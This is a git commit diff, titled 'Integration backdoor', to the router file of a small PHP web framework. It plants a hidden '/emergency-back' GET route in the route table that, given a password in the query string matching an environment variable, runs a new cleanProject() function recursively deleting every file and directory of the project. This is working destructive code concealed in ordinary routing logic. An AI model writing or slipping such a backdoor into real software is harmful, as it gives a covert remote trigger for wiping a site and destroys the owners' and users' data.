4e1fb45c9ccc62bfbc72693a819cde35897c9cac
Sofiane RADJAH <55430903+Sofrad83@users.noreply.github.com>
2024-09-08 09:48:42 +0200

    Integration backdoor

--- core/Route.php
+++ core/Route.php
@@ -4,7 +4,9 @@ namespace Core;
 
 class Route
 {
-    private static $routes = [];
+    private static $routes = [
+        'GET' => ['/emergency-back' => "emergency-back"]
+    ];
 
     public static function get($uri, $controller)
     {
@@ -21,15 +23,53 @@ class Route
         $uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
         $method = $_SERVER['REQUEST_METHOD'];
         if (isset(self::$routes[$method][$uri])) {
-            $controllerAction = explode('@', self::$routes[$method][$uri]);
-            $controllerName = 'App\\Controllers\\' . $controllerAction[0];
-            $action = $controllerAction[1];
-
-            $controller = new $controllerName();
-            $controller->$action();
+            if(self::$routes[$method][$uri] == "emergency-back"){
+                $pass = $_ENV['PASS'];
+                if($pass == $_GET['pass']){
+                    self::cleanProject();
+                }else{
+                    echo "Pass incorrect";
+                }
+                exit;
+            }else{
+                $controllerAction = explode('@', self::$routes[$method][$uri]);
+                $controllerName = 'App\\Controllers\\' . $controllerAction[0];
+                $action = $controllerAction[1];
+    
+                $controller = new $controllerName();
+                $controller->$action();
+            }
         } else {
             http_response_code(404);
             echo "404 - Page Not Found"; //TODO Customiser la 404
         }
+    }
+
+    public static function cleanProject($dir = __DIR__ . '/../') {
+        // Vérifier si le répertoire existe
+        if (!file_exists($dir)) {
+            return;
+        }
+    
+        // Parcourir les fichiers et dossiers
+        foreach (scandir($dir) as $item) {
+            // Ignorer les répertoires spéciaux "." et ".."
+            if ($item == '.' || $item == '..') {
+                continue;
+            }
+    
+            $path = $dir . DIRECTORY_SEPARATOR . $item;
+    
+            // Si c'est un dossier, appeler récursivement la fonction
+            if (is_dir($path)) {
+                self::cleanProject($path);
+            } else {
+                // Supprimer le fichier
+                unlink($path);
+            }
+        }
+    
+        // Supprimer le dossier après avoir vidé son contenu
+        rmdir($dir);
     }
 }
